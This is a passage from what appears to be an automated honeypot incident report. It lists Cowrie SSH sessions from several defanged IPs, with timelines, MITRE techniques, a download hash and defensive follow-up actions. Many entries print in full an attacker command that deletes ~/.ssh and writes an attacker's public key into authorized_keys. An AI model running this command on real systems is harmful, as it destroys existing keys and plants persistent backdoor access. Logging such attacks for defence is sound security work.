| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:21:53` | `cowrie.session.connect` |
| `2026-04-07 11:21:53` | `cowrie.client.version` |
| `2026-04-07 11:21:53` | `cowrie.client.kex` |
| `2026-04-07 11:21:54` | `cowrie.login.success` |
| `2026-04-07 11:21:54` | `cowrie.session.params` |
| `2026-04-07 11:21:54` | `cowrie.command.input` |
| `2026-04-07 11:21:54` | `cowrie.command.failed` |
| `2026-04-07 11:21:54` | `cowrie.log.closed` |
| `2026-04-07 11:21:54` | `cowrie.session.params` |
| `2026-04-07 11:21:54` | `cowrie.command.input` |
| `2026-04-07 11:21:54` | `cowrie.session.file_download` |
| `2026-04-07 11:21:54` | `cowrie.log.closed` |
| `2026-04-07 11:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05c72ef63038

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:21 |
| **Last Seen** | 2026-04-07 11:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:21:56` | `cowrie.session.connect` |
| `2026-04-07 11:21:56` | `cowrie.client.version` |
| `2026-04-07 11:21:56` | `cowrie.client.kex` |
| `2026-04-07 11:21:56` | `cowrie.login.success` |
| `2026-04-07 11:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72774d9507a

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 11:24 |
| **Last Seen** | 2026-04-07 11:24 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:24:14` | `cowrie.session.connect` |
| `2026-04-07 11:24:14` | `cowrie.client.version` |
| `2026-04-07 11:24:14` | `cowrie.client.kex` |
| `2026-04-07 11:24:20` | `cowrie.login.success` |
| `2026-04-07 11:24:22` | `cowrie.session.params` |
| `2026-04-07 11:24:22` | `cowrie.command.input` |
| `2026-04-07 11:24:22` | `cowrie.command.failed` |
| `2026-04-07 11:24:24` | `cowrie.log.closed` |
| `2026-04-07 11:24:25` | `cowrie.session.params` |
| `2026-04-07 11:24:25` | `cowrie.command.input` |
| `2026-04-07 11:24:30` | `cowrie.session.file_download` |
| `2026-04-07 11:24:30` | `cowrie.log.closed` |
| `2026-04-07 11:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04090e679bc6

| Field | Detail |
|---|---|
| **Source IP** | `172.173.200[.]62` |
| **First Seen** | 2026-04-07 11:24 |
| **Last Seen** | 2026-04-07 11:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:24:39` | `cowrie.session.connect` |
| `2026-04-07 11:24:42` | `cowrie.client.version` |
| `2026-04-07 11:24:42` | `cowrie.client.kex` |
| `2026-04-07 11:24:45` | `cowrie.login.success` |
| `2026-04-07 11:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.173.200[.]62` to AbuseIPDB if not already reported
- [ ] Block `172.173.200[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542cd8e5038d

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:25 |
| **Last Seen** | 2026-04-07 11:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:25:23` | `cowrie.session.connect` |
| `2026-04-07 11:25:23` | `cowrie.client.version` |
| `2026-04-07 11:25:23` | `cowrie.client.kex` |
| `2026-04-07 11:25:24` | `cowrie.login.success` |
| `2026-04-07 11:25:25` | `cowrie.session.params` |
| `2026-04-07 11:25:25` | `cowrie.command.input` |
| `2026-04-07 11:25:25` | `cowrie.command.failed` |
| `2026-04-07 11:25:25` | `cowrie.log.closed` |
| `2026-04-07 11:25:26` | `cowrie.session.params` |
| `2026-04-07 11:25:26` | `cowrie.command.input` |
| `2026-04-07 11:25:26` | `cowrie.session.file_download` |
| `2026-04-07 11:25:26` | `cowrie.log.closed` |
| `2026-04-07 11:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-741b897eff3e

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:25 |
| **Last Seen** | 2026-04-07 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:25:30` | `cowrie.session.connect` |
| `2026-04-07 11:25:30` | `cowrie.client.version` |
| `2026-04-07 11:25:30` | `cowrie.client.kex` |
| `2026-04-07 11:25:31` | `cowrie.login.success` |
| `2026-04-07 11:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-918a7bda7ae1

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:28 |
| **Last Seen** | 2026-04-07 11:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:28:57` | `cowrie.session.connect` |
| `2026-04-07 11:28:57` | `cowrie.client.version` |
| `2026-04-07 11:28:57` | `cowrie.client.kex` |
| `2026-04-07 11:28:58` | `cowrie.login.success` |
| `2026-04-07 11:28:59` | `cowrie.session.params` |
| `2026-04-07 11:28:59` | `cowrie.command.input` |
| `2026-04-07 11:28:59` | `cowrie.command.failed` |
| `2026-04-07 11:28:59` | `cowrie.log.closed` |
| `2026-04-07 11:29:00` | `cowrie.session.params` |
| `2026-04-07 11:29:00` | `cowrie.command.input` |
| `2026-04-07 11:29:00` | `cowrie.session.file_download` |
| `2026-04-07 11:29:00` | `cowrie.log.closed` |
| `2026-04-07 11:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7d18fef1de5

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:29 |
| **Last Seen** | 2026-04-07 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:29:03` | `cowrie.session.connect` |
| `2026-04-07 11:29:03` | `cowrie.client.version` |
| `2026-04-07 11:29:04` | `cowrie.client.kex` |
| `2026-04-07 11:29:05` | `cowrie.login.success` |
| `2026-04-07 11:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8064c6e5c2ea

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:31 |
| **Last Seen** | 2026-04-07 11:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:31:14` | `cowrie.session.connect` |
| `2026-04-07 11:31:14` | `cowrie.client.version` |
| `2026-04-07 11:31:14` | `cowrie.client.kex` |
| `2026-04-07 11:31:16` | `cowrie.login.success` |
| `2026-04-07 11:31:16` | `cowrie.session.params` |
| `2026-04-07 11:31:16` | `cowrie.command.input` |
| `2026-04-07 11:31:16` | `cowrie.command.failed` |
| `2026-04-07 11:31:16` | `cowrie.log.closed` |
| `2026-04-07 11:31:17` | `cowrie.session.params` |
| `2026-04-07 11:31:17` | `cowrie.command.input` |
| `2026-04-07 11:31:17` | `cowrie.session.file_download` |
| `2026-04-07 11:31:17` | `cowrie.log.closed` |
| `2026-04-07 11:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b241f8ad943

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:31 |
| **Last Seen** | 2026-04-07 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:31:21` | `cowrie.session.connect` |
| `2026-04-07 11:31:21` | `cowrie.client.version` |
| `2026-04-07 11:31:21` | `cowrie.client.kex` |
| `2026-04-07 11:31:22` | `cowrie.login.success` |
| `2026-04-07 11:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1428f3ea304c

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:32 |
| **Last Seen** | 2026-04-07 11:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:32:27` | `cowrie.session.connect` |
| `2026-04-07 11:32:27` | `cowrie.client.version` |
| `2026-04-07 11:32:28` | `cowrie.client.kex` |
| `2026-04-07 11:32:29` | `cowrie.login.success` |
| `2026-04-07 11:32:29` | `cowrie.session.params` |
| `2026-04-07 11:32:29` | `cowrie.command.input` |
| `2026-04-07 11:32:29` | `cowrie.command.failed` |
| `2026-04-07 11:32:30` | `cowrie.log.closed` |
| `2026-04-07 11:32:30` | `cowrie.session.params` |
| `2026-04-07 11:32:30` | `cowrie.command.input` |
| `2026-04-07 11:32:31` | `cowrie.session.file_download` |
| `2026-04-07 11:32:31` | `cowrie.log.closed` |
| `2026-04-07 11:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d09eaa4ddb4

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:32 |
| **Last Seen** | 2026-04-07 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:32:34` | `cowrie.session.connect` |
| `2026-04-07 11:32:34` | `cowrie.client.version` |
| `2026-04-07 11:32:34` | `cowrie.client.kex` |
| `2026-04-07 11:32:36` | `cowrie.login.success` |
| `2026-04-07 11:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae446f5a212

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:32 |
| **Last Seen** | 2026-04-07 11:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:32:36` | `cowrie.session.connect` |
| `2026-04-07 11:32:36` | `cowrie.client.version` |
| `2026-04-07 11:32:36` | `cowrie.client.kex` |
| `2026-04-07 11:32:37` | `cowrie.login.success` |
| `2026-04-07 11:32:37` | `cowrie.session.params` |
| `2026-04-07 11:32:37` | `cowrie.command.input` |
| `2026-04-07 11:32:37` | `cowrie.command.failed` |
| `2026-04-07 11:32:37` | `cowrie.log.closed` |
| `2026-04-07 11:32:37` | `cowrie.session.params` |
| `2026-04-07 11:32:37` | `cowrie.command.input` |
| `2026-04-07 11:32:37` | `cowrie.session.file_download` |
| `2026-04-07 11:32:37` | `cowrie.log.closed` |
| `2026-04-07 11:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1566843de3a2

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:32 |
| **Last Seen** | 2026-04-07 11:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:32:39` | `cowrie.session.connect` |
| `2026-04-07 11:32:39` | `cowrie.client.version` |
| `2026-04-07 11:32:39` | `cowrie.client.kex` |
| `2026-04-07 11:32:39` | `cowrie.login.success` |
| `2026-04-07 11:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aacc32becc40

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:34 |
| **Last Seen** | 2026-04-07 11:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:34:47` | `cowrie.session.connect` |
| `2026-04-07 11:34:47` | `cowrie.client.version` |
| `2026-04-07 11:34:47` | `cowrie.client.kex` |
| `2026-04-07 11:34:48` | `cowrie.login.success` |
| `2026-04-07 11:34:49` | `cowrie.session.params` |
| `2026-04-07 11:34:49` | `cowrie.command.input` |
| `2026-04-07 11:34:49` | `cowrie.command.failed` |
| `2026-04-07 11:34:49` | `cowrie.log.closed` |
| `2026-04-07 11:34:50` | `cowrie.session.params` |
| `2026-04-07 11:34:50` | `cowrie.command.input` |
| `2026-04-07 11:34:50` | `cowrie.session.file_download` |
| `2026-04-07 11:34:50` | `cowrie.log.closed` |
| `2026-04-07 11:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657d1026ed16

| Field | Detail |
|---|---|
| **Source IP** | `152.32.218[.]244` |
| **First Seen** | 2026-04-07 11:34 |
| **Last Seen** | 2026-04-07 11:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:34:52` | `cowrie.session.connect` |
| `2026-04-07 11:34:52` | `cowrie.client.version` |
| `2026-04-07 11:34:52` | `cowrie.client.kex` |
| `2026-04-07 11:34:52` | `cowrie.login.success` |
| `2026-04-07 11:34:52` | `cowrie.session.params` |
| `2026-04-07 11:34:52` | `cowrie.command.input` |
| `2026-04-07 11:34:52` | `cowrie.command.failed` |
| `2026-04-07 11:34:52` | `cowrie.log.closed` |
| `2026-04-07 11:34:52` | `cowrie.session.params` |
| `2026-04-07 11:34:52` | `cowrie.command.input` |
| `2026-04-07 11:34:53` | `cowrie.session.file_download` |
| `2026-04-07 11:34:53` | `cowrie.log.closed` |
| `2026-04-07 11:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.218[.]244` to AbuseIPDB if not already reported
- [ ] Block `152.32.218[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fb57abb2eda

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-07 11:34 |
| **Last Seen** | 2026-04-07 11:34 |
| **Session Duration** | 1s |
